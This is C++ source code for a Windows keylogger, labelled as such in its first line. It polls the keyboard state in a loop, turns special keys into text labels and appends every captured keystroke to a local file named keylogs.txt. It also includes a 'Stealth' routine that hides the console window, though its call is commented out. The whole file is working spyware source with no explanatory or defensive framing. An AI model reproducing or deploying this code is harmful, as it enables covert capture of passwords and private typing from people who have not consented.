//keylogger source code
#include<iostream>
#include<windows.h>
#include<Windows.h>
#include<winuser.h>
#include<fstream>
#include<conio.h>
#include<stdio.h>
#include<string>
#include<time.h>

using namespace std;

void Write_To_Log(LPCSTR text){
	ofstream logfile;
	logfile.open("keylogs.txt", fstream::app);
	logfile << text;
	logfile.close();
}

void Stealth(){
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}

bool Key_Is_Listed(int ikey){

	HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(h, FOREGROUND_BLUE | FOREGROUND_INTENSITY);

	switch (ikey)
	{
	case VK_F1:
		cout << "[F1]";
		Write_To_Log("[F1]");
		break;
	case VK_F2:
		cout << "[F2]";
		Write_To_Log("[F2]");
		break;
	case VK_F3:
		cout << "[F3]";
		Write_To_Log("[F3]");
		break;
	case VK_F4:
		cout << "[F4]";
		Write_To_Log("[F4]");
		break;
	case VK_F5:
		cout << "[F5]";
		Write_To_Log("[F5]");
		break;
	case VK_F6:
		cout << "[F6]";
		Write_To_Log("[F6]");
		break;
	case VK_F7:
		cout << "[F7]";
		Write_To_Log("[F7]");
		break;
	case VK_F8:
		cout << "[F8]";
		Write_To_Log("[F8]");
		break;
	case VK_F9:
		cout << "[F9]";
		Write_To_Log("[F9]");
		break;
	case VK_F10:
		cout << "[F10]";
		Write_To_Log("[F10]");
		break;
	case VK_F11:
		cout << "[F11]";
		Write_To_Log("[F11]");
		break;
	case VK_F12:
		cout << "[F12]";
		Write_To_Log("[F12]");
		break;
	case VK_HOME:
		cout << "[HOME]";
		Write_To_Log("[HOME]");
		break;
	case VK_INSERT:
		cout << "[INSERT]";
		Write_To_Log("[INSERT]");
		break;
	case VK_CAPITAL:
		cout << " [CAPS LOCK]";
		Write_To_Log(" [CAPS LOCK]");
		break;
	case VK_MENU:
		cout << "[ALT]";
		Write_To_Log(" [ALT]");
		break;
	case VK_PRIOR:
		cout << "[PAGE UP]";
		Write_To_Log("[PAGE UP]");
		break;
	case VK_NEXT:
		cout << "[PAGE DOWN]";
		Write_To_Log("[PAGE DOWN]");
		break;
	case VK_END:
		cout << "[END]";
		Write_To_Log("[END]");
		break;
	case VK_LEFT:
		cout << " [LEFT ARROW] ";
		Write_To_Log(" [LEFT ARROW] ");
		break;
	case VK_UP:
		cout << " [UP ARROW] ";
		Write_To_Log(" [UP ARROW] ");
		break;
	case VK_DOWN:
		cout << " [DOWN ARROW] ";
		Write_To_Log(" [DOWN ARROW]");
		break;
	case VK_RIGHT:
		cout << " [RIGHT ARROW] ";
		Write_To_Log(" [RIGHT ARROW] ");
		break;
	case VK_DELETE:
		cout << " [DEL] ";
		Write_To_Log(" [DEL] ");
		break;
	case VK_ESCAPE:
		cout << " [ESC] ";
		Write_To_Log(" [ESC] ");
		break;
	case VK_CONTROL:
		cout << " [CTRL] ";
		Write_To_Log(" [CTRL] ");
		break;
	case VK_TAB:
		cout << " [TAB] ";
		break;
	case VK_SPACE:
		cout << " ";
		Write_To_Log(" ");
		break;
	case VK_RETURN:
		cout << "\n";
		Write_To_Log("\n");
		break;
	case VK_SHIFT:
		cout << " [SHFT] ";
		Write_To_Log(" [SHFT] ");
		break;
	case VK_BACK:
		cout << "\b";
		Write_To_Log("\b");
		break;
	case VK_RBUTTON:
		cout << " [Rclick] ";
		Write_To_Log(" [Rclick] ");
		break;
	case VK_LBUTTON:
		cout << " [Lclick] ";
		Write_To_Log(" [Lclick] ");
		break;
	case VK_OEM_PLUS:
		cout << "+";
		Write_To_Log("+");
		break;
	case VK_MULTIPLY:
		cout << "*";
		Write_To_Log("*");
		break;
	case VK_ADD:
		cout << "+";
		Write_To_Log("+");
		break;
	case VK_SUBTRACT:
		cout << "-";
		Write_To_Log("-");
		break;
	case VK_SEPARATOR:
		cout << "/";
		Write_To_Log("/");
		break;
	case VK_DECIMAL:
		cout << ".";
		Write_To_Log(".");
		break;
	case VK_DIVIDE:
		cout << " /";
		Write_To_Log("/");
		break;
	case VK_OEM_COMMA:
		cout << " ,";
		Write_To_Log(",");
		break;
	case VK_OEM_1:
		cout << "(;/:)";
		Write_To_Log(";/:");
		break;
	case VK_OEM_2:
		cout << "(? /)";
		Write_To_Log("(? /)");
		break;
	case VK_OEM_3:
		cout << "(`/~)";
		Write_To_Log("(`/~)");
		break;
	case VK_OEM_4:
		cout << "([/{)";
		Write_To_Log("([/{)");
		break;
	case VK_OEM_5:
		cout << "|";
		Write_To_Log("|");
		break;
	case VK_OEM_6:
		cout << "(]/})";
		Write_To_Log("(]/})");
		break;
	case VK_OEM_7:
		cout << "( ""/' )";
		Write_To_Log(" (""/' )");
		break;
	case VK_BROWSER_BACK:
		cout << "[BROWSER BACK]";
		Write_To_Log("[BROWSER BACK]");
		break;
	case VK_BROWSER_FAVORITES:
		cout << "[BROWSER FAVORITES]";
		Write_To_Log("[BROWSER FAVORITES]");
		break;
	case VK_BROWSER_FORWARD:
		cout << "[BROWSER FORWARD]";
		Write_To_Log("[BROWSER FORWARD] ");
		break;
	case VK_BROWSER_HOME:
		cout << "[BROWSER HOME]";
		Write_To_Log("[BROWSER HOME]");
		break;
	case VK_BROWSER_REFRESH:
		cout << "[BROWSER REFRESH]";
		Write_To_Log("[BROWSER REFRESH]");
		break;
	case VK_BROWSER_SEARCH:
		cout << "[BROWSER_SEARCH]";
		Write_To_Log("[BROWSER_SEARCH]");
		break;
	case VK_BROWSER_STOP:
		cout << "[BROWSER_STOP]";
		Write_To_Log("[BROWSER_STOP]");
		break;
	default: return false;
	}
}

int main(){

	MSG Msg;
	//Stealth();
	char key;
	while (TRUE){
		Sleep(10);
		for (key = 8; key <= 190; key++){
			if (GetAsyncKeyState(key) == -32767){
				if (Key_Is_Listed(key) == FALSE){
					cout << key;
					ofstream logfile;
					logfile.open("keylogs.txt", fstream::app);
					logfile << key;
					logfile.close();
				}
			}
		}
	}

	return 0;
}
